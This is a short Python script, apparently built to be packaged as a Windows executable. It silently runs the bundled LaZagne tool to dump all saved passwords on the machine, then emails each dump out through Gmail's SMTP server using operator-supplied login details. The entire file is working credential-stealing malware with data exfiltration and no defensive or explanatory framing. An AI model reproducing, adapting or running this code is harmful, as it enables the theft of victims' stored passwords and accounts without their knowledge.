import subprocess
import smtplib
import re
import sys
import os
import shutil

CREDENTIALS_DIR = 'credentials'

def send_mail(email, password, message):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

os.chdir(sys._MEIPASS)
os.makedirs(CREDENTIALS_DIR)
command = f'laZagne\\laZagne.exe all -quiet -oN -output {CREDENTIALS_DIR}'
subprocess.call(command, shell=True)
for credential in os.listdir(CREDENTIALS_DIR):
	with open(f'{CREDENTIALS_DIR}\\{credential}', 'r') as myfile:
		message = myfile.read()
		send_mail('', '', message) # Pass your credentials here
